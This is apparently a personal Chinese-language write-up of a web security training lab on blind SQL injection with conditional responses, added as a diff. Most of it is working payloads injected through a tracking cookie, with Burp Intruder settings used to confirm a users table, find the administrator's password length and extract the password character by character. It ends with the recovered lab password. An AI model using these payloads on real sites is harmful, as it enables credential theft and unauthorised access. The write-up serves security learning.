@@ -1,0 +1,53 @@
+带条件响应的盲 SQL 注入:
+Cookie: TrackingId=.....
+
+
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+>> true => welcome back
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4''
+>> ok but not welcomeback
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'--'
+>> ok welcome back
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' and 1=1--'
+>> ok welcome back 两边条件通过and结果都为真
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' and 1=0--'
+>> ok no welcome back 右边条件不为真
+>> 可以根据右边单个条件来判断正确与否
+
+' and (select 'zpa' from users limit 1) = 'zpa'--
+>> 限制输出users表（前提存在）输出一行'zpa' 
+>> 'zpa'='zpa'为真
+>> welcome back 确认了users表的存在
+
+' and (select 'a' from users where username = 'administrator') = 'a'--
+>> 从users表中查询到了username=administrator用户
+
+' and (select 'a' from users where username = 'administrator' and length(password)>1) = 'a'--
+>> 判断password长度是否超过1
+>> 启用爆破 intruder
+>> 设置payload为1的位置, type:Numbers, range:1~25, step:1
+>> start
+>> 当出现不同长度时,判断>20处,response没有welcome back
+>> 确认password长度为20
+
+' and (select substring(password, 1,1) from users where username = 'administrator') = 'a'--
+>> 确认密码，substring拼接字符串, 密码第一位，输出第一个字符
+>> no welcome back, 第一个字符不是a
+
+>> 使用集束炸弹cluster bomb attack
+>> add $1$（中间那个）, $a$
+>> 1-numbers -> 1~20
+>> 2-brute forcer -> minlen,maxlen: 1 1
+>> setting -> grep-match -> clear and add welcome back
+>> start attack
+>> 根据welcomeback生序排列，1～20 =>> 对应字符或数字
+>> 题目规定小写和数字组成
+>> 6qb12t9bymdgfh3ijba0
+
+>> congratulations 
+
